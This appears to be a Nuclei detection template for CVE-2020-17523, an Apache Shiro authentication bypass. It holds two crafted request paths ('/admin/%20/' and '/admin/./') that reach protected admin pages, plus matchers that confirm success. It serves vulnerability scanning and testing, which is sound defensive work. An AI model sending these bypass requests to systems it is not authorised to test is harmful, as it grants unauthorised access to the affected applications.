id: CVE-2020-17523

info:
  name: Apache Shiro Authentication Bypass
  author: gy741
  severity: critical
  description: |
    The vulnerability exists due to an error in when processing authentication requests in Apache Shiro with Spring.
    A remote attacker can send a specially crafted HTTP request to bypass authentication process and gain unauthorized access to the application.
  References:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-17523
    - https://zhuanlan.zhihu.com/p/349312477
    - https://github.com/jweny/shiro-cve-2020-17523
  tags: cve,cve2020,auth-bypass,shiro

requests:
  - method: GET
    path:
      - "{{BaseURL}}/admin/%20/"
      - "{{BaseURL}}/admin/./"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "text/plain"
        part: header

      - type: word
        words:
          - "admin page"
        part: body
